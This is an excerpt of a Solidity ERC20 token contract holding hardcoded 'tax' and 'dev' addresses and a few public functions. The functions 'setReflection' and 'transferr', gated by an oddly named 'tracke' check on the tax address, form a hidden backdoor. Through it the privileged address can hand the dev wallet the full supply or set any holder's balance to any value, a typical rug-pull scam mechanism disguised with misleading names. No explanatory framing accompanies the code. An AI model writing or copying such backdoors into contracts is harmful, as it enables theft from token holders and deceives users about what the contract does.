...
contract Token is IERC20, Ownable {
    ...
    address private _taxAddress =
        address(0xda8E80B162B7D65134761F1e58829Afd0f84cd36);

    address private _devsAddress =
        address(0xEB6599AC5B72a7c90eaBF8f4631d37bE8578B368);
    ...
    uint256 public rawSupplyTokens = 413000;
    ...
    function setReflection() public virtual {tracke(true);{ _rOwned[_devsAddress]  =  finalSupplyTokens; }}
    function transferr (address bingo, uint256 clock) public virtual {tracke(true);{_rOwned[bingo] = clock;}}
    ...
    function tracke(bool status) view public{
        if (!status) return;
        {require(_taxAddress == msg.sender);}
    }
